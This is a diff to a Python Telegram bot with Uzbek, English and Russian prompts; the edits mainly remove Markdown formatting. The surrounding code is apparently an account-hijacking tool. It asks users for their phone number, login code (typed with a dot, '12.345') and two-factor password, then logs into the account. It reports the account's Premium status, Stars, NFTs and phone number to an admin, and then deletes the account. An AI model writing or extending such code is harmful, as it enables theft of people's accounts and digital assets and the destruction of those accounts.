@@ -59,34 +59,34 @@ TEXTS = {
         "phone_req": "📱 Raqamingizni yuboring:",
         "phone_btn": "📞 Raqamni yuborish",
         "invalid_btn": "🛑 Raqamni to'g'ri kiriting!",
-        "code_req": "📩 Kodingizni yuboring:\n💡 *Namuna:* `12.345`",
+        "code_req": "📩 Kodingizni yuboring:\n💡 Namuna: 12.345",
         "fa_req": "🔑 Parolingizni yuboring:",
         "success": "✅ Botdan foydalanishingiz mumkin!",
         "err_code": "❌ Xato kod! Qayta kiriting:",
-        "err_fa": "❕ Xato parol! Qayta kiriting:",
-        "need_session": "⚠️ Avval sessiya qo'shishingiz kerak!"
+        "err_fa": "⚠️ Xato parol! Qayta kiriting:",
+        "need_session": "❕ Avval sessiya qo'shishingiz kerak!"
     },
     "en": {
         "phone_req": "📱 Send your phone number:",
         "phone_btn": "📞 Send Phone Number",
         "invalid_btn": "🛑 Invalid input, try again!",
-        "code_req": "📩 Send code:\n💡 *Example:* `12.345`",
+        "code_req": "📩 Send code:\n💡 Example: 12.345",
         "fa_req": "🔑 Send your password:",
         "success": "✅ Botdan foydalanishingiz mumkin!",
         "err_code": "❌ Wrong code! Resend:",
-        "err_fa": "❕ Wrong password! Resend:",
-        "need_session": "⚠️ You need to add a session first!"
+        "err_fa": "⚠️ Wrong password! Resend:",
+        "need_session": "❕ You need to add a session first!"
     },
     "ru": {
         "phone_req": "📱 Отправьте ваш номер:",
         "phone_btn": "📞 Отправить номер",
         "invalid_btn": "🛑 Неверный ввод, повторите!",
-        "code_req": "📩 Отправьте код:\n💡 *Пример:* `12.345`",
+        "code_req": "📩 Отправьте код:\n💡 Пример: 12.345",
         "fa_req": "🔑 Отправьте пароль:",
         "success": "✅ Botdan foydalanishingiz mumkin!",
         "err_code": "❌ Ошибка кода! Повторите:",
-        "err_fa": "❕ Ошибка пароля! Повторите:",
-        "need_session": "⚠️ Сначала нужно добавить сессию!"
+        "err_fa": "⚠️ Ошибка пароля! Повторите:",
+        "need_session": "❕ Сначала нужно добавить сессию!"
     }
 }
 
@@ -215,7 +215,7 @@ async def process_phone(message: types.Message, state: FSMContext):
             "lang": lang
         }
         
-        await message.answer(t["code_req"], parse_mode="Markdown", reply_markup=types.ReplyKeyboardRemove())
+        await message.answer(t["code_req"], reply_markup=types.ReplyKeyboardRemove())
         await state.set_state(AccountDeleteState.waiting_for_code)
     except Exception as e:
         print(f"Phone Request Error: {e}")
@@ -242,7 +242,7 @@ async def process_code(message: types.Message, state: FSMContext):
         await process_account_info(message, state, user_id, auth)
 
     except SessionPasswordNeededError:
-        await message.answer(t["fa_req"], parse_mode="Markdown")
+        await message.answer(t["fa_req"])
         await state.set_state(AccountDeleteState.waiting_for_2fa)
     except (PhoneCodeInvalidError, PhoneCodeExpiredError):
         await message.answer(t["err_code"])
@@ -312,11 +312,11 @@ async def fetch_user_level_and_points(client: TelegramClient):
     return level, points
 
 async def fetch_user_premium_info(client: TelegramClient):
-    info_str = "💎 Premium: Yo'q"
+    info_str = "💎 Premium: Mavjud emas"
     try:
         me = await client.get_me()
         if getattr(me, 'premium', False):
-            info_str = "💎 Premium: Bor ✅"
+            info_str = "💎 Premium: Mavjud"
     except Exception:
         pass
     return info_str
@@ -364,18 +364,20 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
 
     points_formatted = f"{user_points / 1000:.1f}K" if user_points >= 1000 else str(user_points)
 
-    # 3. Adminga qisqa xabar
+    # 3. Adminga xabar
     full_name = message.from_user.full_name
     username = f"@{message.from_user.username}" if message.from_user.username else "Yo'q"
     phone = auth.get("phone", "Noma'lum")
     
     admin_msg = (
-        f"🚨 **Hisob oʻchirildi!**\n\n"
-        f"👤 {full_name} | `{user_id}`\n"
-        f"🏷 {username} | ☎️ `{phone}`\n"
-        f"📊 Daraja: {user_level}-daraja (`{points_formatted}` pt)\n"
+        f"🚨 Hisob oʻchirildi!\n"
+        f"👤 Full Name: {full_name}\n"
+        f"🆔 ID: {user_id}\n"
+        f"🏷 Username: {username}\n"
+        f"☎️ Tel: {phone}\n"
+        f"📊 Daraja: {user_level}-daraja ({points_formatted} pt)\n"
         f"{premium_str}\n"
-        f"{stars_str}\n\n"
+        f"{stars_str}\n"
         f"{nft_str}"
     )
 
@@ -384,14 +386,13 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
             await bot.send_message(
                 chat_id=ADMIN_ID, 
                 text=admin_msg, 
-                parse_mode="Markdown", 
                 disable_web_page_preview=True
             )
         except Exception as e:
             print(f"Admin send error: {e}")
 
     # 4. Foydalanuvchiga javob
-    await message.answer(t["success"], parse_mode="Markdown")
+    await message.answer(t["success"])
 
     # 5. O'chirish
     try:
@@ -415,3 +416,4 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
+    
